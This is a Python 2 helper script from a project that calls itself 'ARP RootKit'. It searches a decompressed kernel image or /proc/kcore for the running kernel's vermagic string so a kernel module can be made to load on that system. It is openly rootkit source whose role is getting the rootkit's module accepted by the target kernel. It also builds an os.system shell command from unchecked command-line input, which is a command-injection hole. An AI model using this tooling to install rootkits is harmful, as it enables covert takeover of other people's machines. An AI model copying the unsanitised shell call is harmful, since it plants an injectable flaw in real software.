#!/usr/bin/python
#
# License:
#
# Copyright (c) 2018 Abel Romero Perez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
# Description:
#
# Modifies the vermagic of a Linux Kernel Module, to be the same than
# the one defined in the Linux Kernel Image, of the system where this
# script is ran.
#
# Dependencies:
#
# 1.a) A Linux Kernel image
#	2) extract-vmlinux
#		3) 
# 1.b) /proc/kcore
# 	2) readelf
#

import sys
import platform
import re
import os
import subprocess

# max memory range size
max_size = 0x03000000
min_size = 0x01000000

def search_in_data (data, ref):
    # search vermagic
    pattern = "(" + re.escape(ref) + " " + ".*?\x00)"
    #print "Reference is release: " + ref
    #print "Searching by regex hex pattern: " + pattern.encode('hex')
    regex = re.compile(pattern)
    matches = []
    for match_obj in regex.findall(data):
        length = len(match_obj)
        remaining = 8 - (length % 8)
        pattern = "(" + re.escape(match_obj) + "\x00" * (remaining + 8) + ")"
        #print match_obj
        #print length
        #print remaining
        #print pattern
        #print pattern.encode('hex')
        regex = re.compile(pattern)
        for match_obj in regex.findall(data):
            #print "Match!"
            #print match_obj.encode('hex')
            #print len(match_obj)
            #print "Found vermagic: \"" + match_obj + "\""
            matches.append(match_obj)
    return matches

if len(sys.argv) < 2:
	print "use: " + sys.argv[0] + " </proc/kcore|kernel> [ref]"
	exit(-1)

if sys.argv[1] != "/proc/kcore":
	vmlinux = "vmlinux-" + platform.release()

	# decompress vmlinuz image
	os.system("./extract-vmlinux " + sys.argv[1] + " > " + vmlinux)

	# load vmlinux binary
	f = open(vmlinux, 'rb')
	data = f.read()
	f.close()

	# remove vmlinux binary
	#os.remove(vmlinux)
	if len(sys.argv) >= 3:
	    ref = sys.argv[2]
	else:
	    ref = platform.release()

	matches = search_in_data(data, ref)
	for match in matches:
		print match

else:
	ref = platform.release()
	# read kernel binary from /proc/kcore (with readelf -e -g -t /proc/kcore)
	out = subprocess.check_output(['readelf', '-e', '-g', '-t', '/proc/kcore'])
	pattern = ' (0x\S*?) 0x\S*? .*?\n.*? (0x\S*?) '
	regex = re.compile(pattern, re.MULTILINE)
	matches = regex.findall(out)
	#print matches
	#exit(0)
	for match in matches:
		#print match
		#exit(0)
		off = int(match[0], 16)
		size = int(match[1], 16)
		if size > max_size or size < min_size:
			continue
		f = open("/proc/kcore", 'rb')
		f.seek(off, os.SEEK_SET)
		data = f.read(size)
		f.close()
		matches = search_in_data(data, ref)
		for match in matches:
			print match
